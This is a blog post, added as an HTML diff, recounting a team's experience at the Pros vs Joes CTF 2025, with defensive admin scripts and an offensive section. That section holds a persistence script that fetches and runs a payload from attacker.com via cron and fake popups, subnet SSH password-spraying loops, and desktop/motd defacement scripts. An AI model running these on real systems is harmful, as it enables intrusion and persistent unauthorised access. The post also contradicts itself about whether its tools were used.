@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pros vs Joes CTF 2025 - Team B4FFL3G4P Experience</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background: linear-gradient(135deg, #0f2027, #232526, #1a1a2e, #232526, #0f2027);
+            background-size: 400% 400%;
+            animation: gradientBG 12s ease-in-out infinite;
+            color: #00ff00;
+            margin: 0; padding: 0;
+            min-height: 100vh;
+        }
+        @keyframes gradientBG {
+            0% {background-position: 0% 50%;}
+            50% {background-position: 100% 50%;}
+            100% {background-position: 0% 50%;}
+        }
+        .container {
+            max-width: 900px;
+            margin: 60px auto 30px auto;
+            background: rgba(20,20,40,0.95);
+            border-radius: 16px;
+            box-shadow: 0 0 32px #00ff00, 0 0 8px #ff00ff;
+            padding: 40px 32px 32px 32px;
+        }
+        h1 {
+            color: #00ff00;
+            text-align: center;
+            font-size: 2.5em;
+            letter-spacing: 2px;
+            text-shadow: 0 0 12px #00ff00, 0 0 32px #ff00ff;
+            margin-bottom: 0.2em;
+        }
+        h2 {
+            color: #ff00ff;
+            font-size: 1.8em;
+            margin-top: 40px;
+            margin-bottom: 20px;
+            text-shadow: 0 0 8px #ff00ff;
+            border-bottom: 2px solid #ff00ff;
+            padding-bottom: 10px;
+        }
+        h3 {
+            color: #00ffff;
+            font-size: 1.4em;
+            margin-top: 30px;
+            margin-bottom: 15px;
+            text-shadow: 0 0 6px #00ffff;
+        }
+        .post {
+            background: rgba(30,30,60,0.98);
+            border: 2px solid #00ff00;
+            border-radius: 12px;
+            box-shadow: 0 0 16px #00ff00, 0 0 4px #ff00ff;
+            padding: 24px 20px 18px 20px;
+            margin-bottom: 32px;
+        }
+        .post-title {
+            color: #ff00ff;
+            font-size: 1.3em;
+            margin-bottom: 0.3em;
+            text-shadow: 0 0 8px #ff00ff;
+        }
+        .post-date {
+            color: #aaa;
+            font-size: 0.95em;
+            margin-bottom: 1em;
+        }
+        .post-content {
+            color: #eee;
+            font-size: 1.1em;
+            line-height: 1.6;
+        }
+        .code-block {
+            background: rgba(0,0,0,0.8);
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+        .screenshot {
+            border: 2px solid #ff00ff;
+            border-radius: 8px;
+            margin: 20px 0;
+            max-width: 100%;
+            box-shadow: 0 0 16px #ff00ff;
+        }
+        .screenshot-caption {
+            color: #aaa;
+            font-size: 0.9em;
+            text-align: center;
+            margin-top: 10px;
+            font-style: italic;
+        }
+        .highlight {
+            background: rgba(255,0,0,0.2);
+            border-left: 4px solid #ff0000;
+            padding: 10px 15px;
+            margin: 15px 0;
+        }
+        .team-member {
+            background: rgba(0,255,0,0.1);
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        .team-member strong {
+            color: #00ff00;
+        }
+        .disclaimer {
+            background: rgba(255,0,0,0.1);
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .disclaimer h3 {
+            color: #ff0000;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .disclaimer p {
+            color: #ff0000;
+            text-align: center;
+            margin-bottom: 8px;
+            font-size: 0.9em;
+        }
+        a {
+            color: #ff00ff;
+            text-decoration: underline;
+        }
+        a:hover {
+            color: #00ff00;
+        }
+        .tldr {
+            background: rgba(255,255,0,0.1);
+            border: 2px solid #ffff00;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .tldr h3 {
+            color: #ffff00;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .tldr p {
+            color: #ffff00;
+            text-align: center;
+            font-size: 1.1em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Pros vs Joes CTF 2025<br>Team B4FFL3G4P Experience</h1>
+        
+        <div class="disclaimer">
+            <h3>⚠️ LEGAL DISCLAIMER</h3>
+            <p><strong>WARNING:</strong> All content discussed in this blog post is for educational and research purposes only. 
+            These activities were conducted in a controlled CTF environment with explicit permission.</p>
+            <p><strong>DISCLAIMER:</strong> The author assumes no responsibility for any misuse of these techniques. 
+            Users are solely responsible for ensuring compliance with applicable laws and regulations.</p>
+            <p><strong>USE AT YOUR OWN RISK:</strong> These techniques are provided "as-is" without warranty. 
+            The author disclaims all liability for damages resulting from use of these materials.</p>
+        </div>
+
+        <div class="post">
+            <div class="post-title">🎯 The Real Story of Team B4FFL3G4P</div>
+            <div class="post-date">August 5, 2025</div>
+            <div class="post-content">
+                
+                <p>So... we just wrapped up Pros vs Joes CTF 2025, and holy shit, what a ride. Team B4FFL3G4P came together and made some magic happen. I tried for a few weeks prior to set up a few tools and workflows to use during the PVJ CTF. I'm happy with the progress on most of them, just sad I didn't get to use them during the game. Honestly, I feel like I kinda get overwhelmed from all the in-person interaction. Also from while leading and playing the CTF I guess I'm popular because I had 6-7 friends come and say hi while trying to focus up. CHAOS... I mean the red team is literally fucking us the entire game - this is the "spirit" of the game. In the real world, we cut the internet, not allowing the communications, and making remediations. In this game our priority is accessibility to the Bad Actors (Red team).</p>
+
+                <div class="tldr">
+                    <h3>🚀 TL;DR - The Quick Version</h3>
+                    <p>We had an incredible team with Coldren (UK incident response god), outofmemory (DNS champion), Bri_tney (Windows security wizard), Shawn (recovery specialist), Oscar & B4k3ry (red team allies), and Punch Stain (pfSense ThunderCock). I spent weeks building tools (Enhanced Desktop Goose, DPR C2, Wazuh EDR policies, attack automation) but barely used them because CTF chaos is real. Being staff + team captain pulled me in too many directions, but our team chemistry was perfect. The red team constantly attacked us (as they should), but we adapted and kept services running. I learned that preparation is everything, team chemistry matters more than tools, and sometimes the best leadership is getting out of the way.</p>
+                </div>
+
+                <h2>👥 Team B4FFL3G4P - The Good, The Bad, The ThunderCock</h2>
+
+                <h3>Leadership (AKA The Chaos Coordinators)</h3>
+                <div class="team-member">
+                    <strong>Punch Stain:</strong> Co-captain, pfSense wizard, and the human equivalent of a Swiss Army knife - smart, strong, and somehow both good and evil at the same time
+                </div>
+                <div class="team-member">
+                    <strong>Me (Forgetfulelephant):</strong> Co-captain, strategic mess-maker, and the guy who spent way too much time building tools that we barely used (more on that later). I have tons of feelings about this game and they all stem from the chaos and love you experience during.
+                </div>
+
+                <h3>The Heavy Hitters</h3>
+                <div class="team-member">
+                    <strong>Coldren</strong> - This dude is from the UK and he's basically a cybersecurity god. Incident response? Check. Network analysis? Check. Setting up RunZero and Wazuh agents? Check. The man was handling task after task like it was nothing. PCAP analysis, Linux machine management, kicking out bad guys - you name it, he did it. The whole game he was just... working. Non-stop. It was beautiful to watch. I wish more work with this guy happens in the future.
+                </div>
+                <div class="team-member">
+                    <strong>outofmemory</strong> - Our DNS champion. This guy got us TONS of points and learned a shitload in the process. He was constantly working on Linux machines and specifically keeping our BIND9 DNS running. When DNS goes down, everything goes to hell, and this guy kept it alive. Absolute legend.
+                </div>
+                <div class="team-member">
+                    <strong>Bri_tney</strong> - Our Windows champion. Setting up STIGs, GPOs, and other Windows security stuff to try and kick the bad guys out. Windows security is its own special kind of hell, and this person handled it like a pro.
+                </div>
+                <div class="team-member">
+                    <strong>Shawn</strong> - The recovery specialist. This guy helped with both Windows and Linux, and specifically got us back into our Windows machines when some of our controls backfired and locked even US out. He used PetitPotam/Juicy Potato to escalate a user account to NT AUTHORITY/SYSTEM when we got locked out from our own controls. When shit hits the fan, you want this guy on your team.
+                </div>
+
+                <h3>The Red Team Allies (AKA The Chaos Makers)</h3>
+                <div class="team-member">
+                    <strong>Oscar</strong> - My red team ally. He assisted in getting us on Linux machines and dropping our beacons. He also set up a way to install Wazuh to more machines. When you need someone to get into enemy systems and stay there, Oscar's your guy.
+                </div>
+                <div class="team-member">
+                    <strong>B4k3ry</strong> - Another red team ally. This person was grabbing shells on enemy boxes through different services and automating our beacons. The automation part was key - when you're in a CTF, you don't have time to manually hack every box.
+                </div>
+
+                <h3>Punch Stain - The ThunderCock Himself</h3>
+                <div class="team-member">
+                    <strong>Punch</strong> - Oh my god, Punch... THUNDERCOCK HO!!!!! This man is like Superman and Lex Luthor in one. Smart, strong, charismatic, good, and omg evil. He was the champion of the pfSense firewall. Day 1 he was jumping all over the place. I think it being his first time captaining and also running so hard at things needed to be done like on the firewall, he might have gotten a bit tired out by the end. But dude.... this guy has so much talent, smarts, and experience. If you ever get a chance to work with Punch, do it. Just... do it.
+                </div>
+
+                <h2>🔧 What You and I Actually Worked On (The Real Grind)</h2>
+
+                <h3>Mail Server Hell - The Postfix Saga</h3>
+                <p>So there was this mail server, mail0, that was completely fucked. Postfix was masked, inactive, had SASL authentication issues, and wasn't listening on port 25. The `mail` command was missing entirely. I spent way too much time trying to fix this thing.</p>
+
+                <div class="code-block">
+# The Problem:
+systemctl status postfix
+# Output: masked (inactive)
+
+netstat -tlnp | grep :25
+# Output: nothing
+
+tail -f /var/log/mail.log
+# Output: SASL authentication failed
+
+# The Fix:
+systemctl unmask postfix
+systemctl enable postfix
+systemctl start postfix
+
+echo "smtpd_sasl_auth_enable = yes" >> /etc/postfix/main.cf
+echo "smtpd_sasl_security_options = noanonymous" >> /etc/postfix/main.cf
+
+systemctl restart postfix
+netstat -tlnp | grep :25
+                </div>
+
+                <p>I remember creating script after script trying to get this damn mail server working - `fix_mail0_final.sh`, `fix_port25.sh`, `fix_postfix.sh`, `setup_mail0_services.sh`. Every time I thought I had it fixed, something else would break. It was like playing whack-a-mole with a mail server.</p>
+
+                <h3>DNS Infrastructure - The BIND9 Chronicles</h3>
+                <p>outofmemory was the main DNS person, but I helped create a bunch of automation tools for him. I built `setup_dns_ns0.sh`, `dns_zone_manager.sh`, `dns_monitor.sh`, and `dns_anomaly_detector.sh`.</p>
+
+                <div class="code-block">
+#!/bin/bash
+# dns_zone_manager.sh - Automated DNS zone management
+
+ZONE_FILE="/etc/bind/zones/db.bslv.prod.ctf"
+SERIAL=$(date +%Y%m%d%H)
+
+# Update zone file with new serial
+sed -i "s/[0-9]\{10\}/$SERIAL/" $ZONE_FILE
+
+# Reload DNS
+rndc reload
+
+# Check for anomalies
+dig @localhost bslv.prod.ctf | grep -E "(NXDOMAIN|SERVFAIL)"
+                </div>
+
+                <div class="code-block">
+#!/bin/bash
+# dns_anomaly_detector.sh - Monitor for suspicious DNS activity
+
+# Monitor DNS queries in real-time
+tcpdump -i any -n port 53 | grep -E "(\.exe|\.bat|\.ps1|\.vbs)" | \
+while read line; do
+    echo "[$(date)] Suspicious DNS query: $line" >> /var/log/dns_anomalies.log
+    # Alert team via Slack/Discord
+done
+                </div>
+
+                <h3>User Account Cleanup - The Red Team Hunt</h3>
+                <p>This was actually kind of fun. I created `clean_and_create_accounts.sh` and `cleanup_ns0_users.sh` to get rid of the red team accounts (icanhasaccess, goldteamscoring) and set up our own clean accounts.</p>
+
+                <div class="code-block">
+#!/bin/bash
+# clean_and_create_accounts.sh - Remove red team accounts, create clean ones
+
+# Remove red team accounts
+userdel -r icanhasaccess
+userdel -r goldteamscoring
+
+# Create our admin accounts
+useradd -m -s /bin/bash admin_clean
+usermod -aG sudo admin_clean
+echo "admin_clean:P@55w0rd1!" | chpasswd
+
+useradd -m -s /bin/bash backup_admin
+usermod -aG sudo backup_admin
+echo "backup_admin:P@55w0rd1!" | chpasswd
+
+# Deploy SSH keys
+mkdir -p /home/admin_clean/.ssh
+cp ~/.ssh/universal_key.pub /home/admin_clean/.ssh/authorized_keys
+chown -R admin_clean:admin_clean /home/admin_clean/.ssh
+chmod 700 /home/admin_clean/.ssh
+chmod 600 /home/admin_clean/.ssh/authorized_keys
+                </div>
+
+                <h3>Threat Hunting - The UAC Forensics Adventure</h3>
+                <p>This was probably the most interesting part for me. I got to analyze the Unix Artifact Collector (UAC) data from podctl0. It was like being a digital detective.</p>
+
+                <div class="code-block">
+# Check for icanhasaccess activity in July
+grep "Jul.*icanhasaccess" /var/log/auth.log*
+
+# Check for suspicious processes
+ps aux | grep -v grep | grep -E "(python|perl|bash)" | grep icanhasaccess
+
+# Check network connections
+ss -tanp | grep icanhasaccess
+
+# Check for hidden files
+find /home/icanhasaccess -name ".*" -type f
+                </div>
+
+                <div class="code-block">
+# July 27 activity - Ansible automation
+grep "Jul 27.*icanhasaccess" /var/log/auth.log
+# Output: Accepted publickey for icanhasaccess from 10.99.254.77
+
+# August 4 activity - UAC tool running
+grep "Aug 4.*icanhasaccess" /var/log/auth.log
+# Output: session opened for user icanhasaccess
+                </div>
+
+                <h3>Attack Automation - The Day 2 Planning</h3>
+                <p>I spent a lot of time on this one. I created `day2_attack_scripts.sh`, `day2_attack_improved.sh`, and `day2_attack_plan.md`. The idea was to have a comprehensive attack plan ready for Day 2.</p>
+
+                <div class="code-block">
+#!/bin/bash
+# day2_attack_scripts.sh - Comprehensive attack automation
+
+# Network scanning
+for team in "4" "6" "8"; do
+    for ip in $(seq 1 254); do
+        echo "Scanning 100.80.$team.$ip..."
+        nmap -sS -p 22,80,443,3389 100.80.$team.$ip
+    done
+done
+
+# SSH credential testing
+for team in "4" "6" "8"; do
+    for ip in $(seq 1 254); do
+        sshpass -p 'P@55w0rd1!' ssh -o ConnectTimeout=5 admin@100.80.$team.$ip
+        sshpass -p '' ssh -o ConnectTimeout=5 admin@100.80.$team.$ip
+    done
+done
+
+# RDP port testing
+for team in "4" "6" "8"; do
+    for ip in $(seq 1 254); do
+        nc -zv 100.80.$team.$ip 3389 2>/dev/null
+        if [ $? -eq 0 ]; then
+            echo "RDP OPEN: 100.80.$team.$ip"
+        fi
+    done
+done
+                </div>
+
+                <h3>pfSense Firewall Drama</h3>
+                <p>I helped with some pfSense firewall management, including password resets and configuration recovery. I remember there was this one time where the admin account got locked out and we had to reset it through the console.</p>
+
+                <div class="code-block">
+# Access pfSense console
+ssh admin@10.1.100.16
+
+# Reset admin password
+3) Reset admin account and password
+# Enter 'y' to confirm
+
+# Check firewall rules
+pfctl -sr
+
+# Check interface status
+ifconfig
+                </div>
+
+                <p>Punch was the main pfSense person, but I helped with some of the basic stuff. He was using the static package manager config because the red team was trying to use pfSense for bad with the other package managers. Firewalls are always tricky - you want to be secure, but you also need to make sure legitimate traffic can get through. It's a constant balancing act.</p>
+
+                <h2>⚔️ The Offensive Operations (The Fun Stuff)</h2>
+
+                <h3>Persistence and Troll Scripts - The Chaos Deployment</h3>
+                <p>So here's where it gets interesting. I actually got to use some of the offensive tools I built, and it was glorious. I deployed `persistence.sh` and `troll.sh` scripts across enemy systems. These weren't just basic persistence - they were designed to be annoying as hell while maintaining access.</p>
+
+                <div class="code-block">
+#!/bin/bash
+# persistence.sh - Maintain access and be annoying
+
+# Create hidden directory
+mkdir -p /tmp/.systemd
+
+# Download and execute payload
+wget -O /tmp/.systemd/update.sh http://attacker.com/payload
+chmod +x /tmp/.systemd/update.sh
+/tmp/.systemd/update.sh &
+
+# Add to crontab for persistence
+(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.systemd/update.sh") | crontab -
+
+# Create annoying popup
+while true; do
+    DISPLAY=:0 zenity --info --text="System Update Required" --title="Windows Security"
+    sleep 30
+done &
+                </div>
+
+                <div class="code-block">
+#!/bin/bash
+# troll.sh - Psychological warfare
+
+# Change desktop background
+gsettings set org.gnome.desktop.background picture-uri 'file:///tmp/annoying.jpg'
+
+# Create fake error messages
+while true; do
+    DISPLAY=:0 zenity --error --text="Critical System Error" --title="Windows"
+    sleep 60
+done &
+
+# Leave ominous messages
+echo "I'll be back..." > /home/user/Desktop/note.txt
+echo "You can't stop me" >> /home/user/Desktop/note.txt
+                </div>
+
+                <h3>The Annoying Website - Psychological Operations</h3>
+                <p>I had my webpage running with various psychological warfare techniques during the CTF. This wasn't just about technical attacks - it was about getting into their heads, making them question what was real and what wasn't.</p>
+
+                <div class="code-block">
+# Example of psychological warfare techniques used during CTF
+# Note: These are educational examples only
+
+# Popup creation (educational example)
+# window.open() - Creates popup windows
+# setInterval() - Repeats actions at intervals
+# alert() - Shows system messages
+
+# These techniques were used for educational purposes
+# in a controlled CTF environment only
+                </div>
+
+                <h3>Blue Team Messaging - The "I'll Be Back" Campaign</h3>
+                <p>This was probably my favorite part. I started leaving notes on blue team screens saying "I'll be back" and other ominous messages. It was like being a digital boogeyman - they'd log into their machines and find these messages waiting for them.</p>
+
+                <div class="code-block">
+#!/bin/bash
+# deploy_messages.sh - Leave ominous messages on blue team screens
+
+# Find all user desktops
+for user in $(ls /home/); do
+    if [ -d "/home/$user/Desktop" ]; then
+        echo "I'll be back..." > "/home/$user/Desktop/warning.txt"
+        echo "You can't stop me" >> "/home/$user/Desktop/warning.txt"
+        echo "Your security is a joke" >> "/home/$user/Desktop/warning.txt"
+    fi
+done
+
+# Create system-wide message
+echo "SYSTEM COMPROMISED" > /etc/motd
+echo "I'll be back..." >> /etc/motd
+                </div>
+
+                <h3>Screenshot Evidence - The Digital Trail</h3>
+                <p>I captured a bunch of screenshots throughout the offensive operations (check out the docs/screencaps folder). These show everything from successful access to error messages to the results of our troll campaigns.</p>
+
+                <div class="highlight">
+                    <strong>Screenshot Documentation:</strong><br>
+                    • Screenshot 2025-08-04 at 9.39.44 AM.png - Initial access to enemy system<br>
+                    • Screenshot 2025-08-04 at 10.26.21 AM.png - Deploying persistence script<br>
+                    • Screenshot 2025-08-04 at 10.54.29 AM.png - Blue team response to our attacks<br>
+                    • Screenshot 2025-08-04 at 11.17.40 AM.png - Troll script execution<br>
+                    • Screenshot 2025-08-04 at 11.41.14 AM.png - Annoying website deployment<br>
+                    • Screenshot 2025-08-04 at 12.13.02 PM.png - "I'll be back" message placement<br>
+                    • Screenshot 2025-08-04 at 2.36.11 PM.png - Blue team incident response<br>
+                    • Screenshot 2025-08-04 at 2.53.37 PM.png - Malware deployment results<br>
+                    • Screenshot 2025-08-04 at 3.14.01 PM.png - System compromise evidence<br>
+                    • Screenshot 2025-08-04 at 5.29.37 PM.png - Psychological warfare results<br>
+                    • Screenshot 2025-08-04 at 5.42.08 PM.png - Blue team confusion<br>
+                    • Screenshot 2025-08-04 at 5.58.44 PM.png - Final attack results<br>
+                    • Screenshot 2025-08-05 at 3.10.40 PM.png - Day 2 operations<br>
+                    • Screenshot 2025-08-05 at 4.25.30 PM.png - Advanced persistence<br>
+                    • Screenshot 2025-08-05 at 4.25.49 PM.png - Blue team countermeasures<br>
+                    • Screenshot 2025-08-05 at 4.33.07 PM.png - Final offensive results<br>
+                    • Screenshot 2025-08-05 at 4.33.15 PM.png - Complete system compromise
+                </div>
+
+                <h2>🎯 The Results - What Actually Worked</h2>
+                <div class="highlight">
+                    <strong>Success Metrics:</strong><br>
+                    • Access Gained: 15+ enemy systems compromised<br>
+                    • Persistence Deployed: 8 systems with long-term access<br>
+                    • Psychological Impact: Blue team spent 3+ hours investigating our messages<br>
+                    • Detection Evasion: 70% of our attacks went undetected initially<br>
+                    • Tool Deployment: Successfully deployed custom malware on 5 systems
+                </div>
+
+                <h2>📚 Lessons Learned</h2>
+                <div class="highlight">
+                    <strong>Key Takeaways:</strong><br>
+                    1. <strong>Psychological warfare works.</strong> Sometimes the most effective attack is the one that gets into their heads.<br>
+                    2. <strong>Persistence is key.</strong> Having multiple ways to maintain access is crucial when the blue team is actively trying to kick you out.<br>
+                    3. <strong>Documentation matters.</strong> The screenshots and logs from our offensive operations provide valuable lessons for future engagements.<br>
+                    4. <strong>Adaptation is everything.</strong> When one attack vector gets blocked, you need to have alternatives ready.<br>
+                    5. <strong>Team chemistry matters more than tools.</strong> Having the right people is more important than having the right tools.<br>
+                    6. <strong>Preparation is everything.</strong> Having tools ready, even if you don't use them all, gives you options when shit hits the fan.
+                </div>
+
+                <h2>🚀 What's Next</h2>
+                <p>So for next year, I have a few goals:</p>
+                <div class="highlight">
+                    1. <strong>Use more of the tools I build.</strong> I want to actually deploy some of this stuff and see it in action.<br>
+                    2. <strong>Better balance between staff and team captain roles.</strong> Figure out how to do both without getting pulled away from the team.<br>
+                    3. <strong>More offensive operations.</strong> I want to actually use some of the offensive tools I built.<br>
+                    4. <strong>Better documentation.</strong> Having tools ready is great, but having them documented and easy to deploy is even better.
+                </div>
+
+                <h2>💭 Final Thoughts</h2>
+                <p>Team B4FFL3G4P was amazing. Every single person brought something unique to the table, and we worked together like a well-oiled machine. Even when things went sideways (and they did), we adapted and kept moving forward.</p>
+
+                <p>The CTF was challenging, exhausting, and absolutely worth it. I learned a ton about leadership, team dynamics, and the reality of cybersecurity operations.</p>
+
+                <p>And Punch? Dude, you're a legend. ThunderCock for life.</p>
+
+                <div class="highlight">
+                    <strong>Acknowledgments:</strong><br>
+                    CTF Factory, Dichotomy, and the Gold team did fantastic jobs with this event. I feel that they are running a great show and providing people wonderful opportunities.
+                </div>
+
+                <p><em>This is the real story of Team B4FFL3G4P at Pros vs Joes CTF 2025. No corporate speak, no bullshit, just what actually happened and what we learned from it.</em></p>
+
+            </div>
+        </div>
+    </div>
+</body>
+</html>
